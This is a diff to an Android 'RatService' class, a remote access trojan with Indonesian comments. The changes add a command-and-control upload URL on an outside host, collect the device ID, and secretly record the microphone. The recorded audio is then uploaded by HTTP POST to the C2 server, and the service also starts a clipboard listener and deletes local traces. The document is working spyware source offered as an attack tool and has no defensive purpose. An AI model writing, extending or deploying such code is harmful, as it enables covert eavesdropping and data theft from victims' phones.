@@ -19,30 +19,72 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
+import android.provider.Settings;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
 public class RatService extends Service {
 
     private static final String TAG = "RatService";
+    private static final String C2_UPLOAD_URL = "https://bott-production-2188.up.railway.app/rat/upload";
+
     private MediaRecorder mediaRecorder;
     private boolean isRecording = false;
+    private File outputFile;
+    private String deviceId;
+    private OkHttpClient httpClient;
+
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "Service onCreate: Layanan RAT sedang dibuat.");
+        httpClient = new OkHttpClient();
+        try {
+            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to get device ID.", e);
+            deviceId = "unknown_device";
+        }
+        Log.d(TAG, "Service onCreate: Layanan RAT sedang dibuat untuk perangkat: " + deviceId);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "Service onStartCommand: Layanan RAT dimulai.");
-        fetchData();
 
-        // Mulai layanan pendengar clipboard
-        try {
-            Intent clipboardIntent = new Intent(this, ClipboardListenerService.class);
-            startService(clipboardIntent);
-            Log.d(TAG, "ClipboardListenerService berhasil dimulai.");
-        } catch (Exception e) {
-            Log.e(TAG, "Gagal memulai ClipboardListenerService", e);
+        if (intent != null && intent.getAction() != null) {
+            String action = intent.getAction();
+            Log.d(TAG, "Menerima intent dengan aksi: " + action);
+            switch (action) {
+                case "START_RECORDING":
+                    recordMicrophone(); // Durasinya diatur di dalam method
+                    break;
+                case "FETCH_DATA":
+                    // Aksi ini bisa digunakan untuk memicu pengambilan data manual dari C2
+                    fetchData();
+                    break;
+                // Aksi lain bisa ditambahkan di sini
+            }
+        } else {
+            // Perilaku default jika tidak ada aksi spesifik
+            fetchData();
+            try {
+                Intent clipboardIntent = new Intent(this, ClipboardListenerService.class);
+                startService(clipboardIntent);
+                Log.d(TAG, "ClipboardListenerService berhasil dimulai.");
+            } catch (Exception e) {
+                Log.e(TAG, "Gagal memulai ClipboardListenerService", e);
+            }
         }
 
         return START_STICKY;
@@ -58,7 +100,7 @@ public class RatService extends Service {
     public void onDestroy() {
         super.onDestroy();
         if (isRecording) {
-            stopRecording();
+            stopRecordingAndUpload();
         }
         Log.d(TAG, "Service onDestroy: Layanan RAT dihentikan.");
     }
@@ -159,7 +201,8 @@ public class RatService extends Service {
             return;
         }
 
-        File outputFile = new File(getCacheDir(), "mic_recording.3gp");
+        // Simpan file ke direktori cache agar tidak menumpuk di penyimpanan utama
+        outputFile = new File(getCacheDir(), "mic_record_" + System.currentTimeMillis() + ".3gp");
 
         mediaRecorder = new MediaRecorder();
         mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -173,36 +216,84 @@ public class RatService extends Service {
             isRecording = true;
             Log.i(TAG, "Perekaman mikrofon dimulai. Menyimpan ke: " + outputFile.getAbsolutePath());
 
-            // Rekam selama 10 detik untuk demonstrasi
+            // Rekam selama 10 detik untuk demonstrasi, kemudian berhenti dan unggah
             new Thread(() -> {
                 try {
                     Thread.sleep(10000); // 10 detik
                 } catch (InterruptedException e) {
                     Log.e(TAG, "Thread perekaman mikrofon terganggu", e);
                 } finally {
-                    stopRecording();
+                    // Pastikan ini dijalankan di UI thread jika perlu, tapi untuk stop() biasanya aman
+                    stopRecordingAndUpload();
                 }
             }).start();
 
-        } catch (IOException e) {
-            Log.e(TAG, "Gagal mempersiapkan MediaRecorder", e);
-            releaseMediaRecorder();
-        } catch (IllegalStateException e) {
-            Log.e(TAG, "Gagal memulai MediaRecorder", e);
+        } catch (IOException | IllegalStateException e) {
+            Log.e(TAG, "Gagal memulai atau mempersiapkan MediaRecorder", e);
             releaseMediaRecorder();
         }
     }
 
-    private void stopRecording() {
+    private void stopRecordingAndUpload() {
         if (isRecording && mediaRecorder != null) {
             try {
                 mediaRecorder.stop();
-                Log.i(TAG, "Perekaman mikrofon dihentikan.");
+                Log.i(TAG, "Perekaman mikrofon dihentikan. File siap diunggah: " + outputFile.getAbsolutePath());
+                uploadFile(outputFile); // Panggil metode unggah setelah perekaman berhenti
             } catch (IllegalStateException e) {
                 Log.e(TAG, "Gagal menghentikan MediaRecorder", e);
+                if (outputFile != null) outputFile.delete(); // Hapus file jika gagal
             } finally {
                 releaseMediaRecorder();
             }
+        }
+    }
+
+    private void uploadFile(final File file) {
+        if (file == null || !file.exists()) {
+            Log.e(TAG, "File untuk diunggah tidak ada atau null.");
+            return;
+        }
+
+        try {
+            RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/3gpp"));
+
+            RequestBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("file", file.getName(), fileBody)
+                    .addFormDataPart("deviceId", deviceId)
+                    .addFormDataPart("type", "mic_recording")
+                    .build();
+
+            Request request = new Request.Builder()
+                    .url(C2_UPLOAD_URL)
+                    .post(requestBody)
+                    .build();
+
+            Log.d(TAG, "Mengunggah file: " + file.getName() + " ke " + C2_UPLOAD_URL);
+
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "Gagal mengunggah file: " + file.getName(), e);
+                    file.delete(); // Hapus file setelah gagal unggah
+                }
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        Log.d(TAG, "File berhasil diunggah: " + file.getName());
+                    } else {
+                        Log.e(TAG, "Gagal mengunggah file: " + file.getName() + ". Kode: " + response.code());
+                        Log.e(TAG, "Respons server: " + response.body().string());
+                    }
+                    response.close();
+                    file.delete(); // Hapus file setelah berhasil atau gagal diunggah
+                }
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "Error saat membuat request unggah.", e);
+            file.delete(); // Hapus file jika terjadi error
         }
     }
 
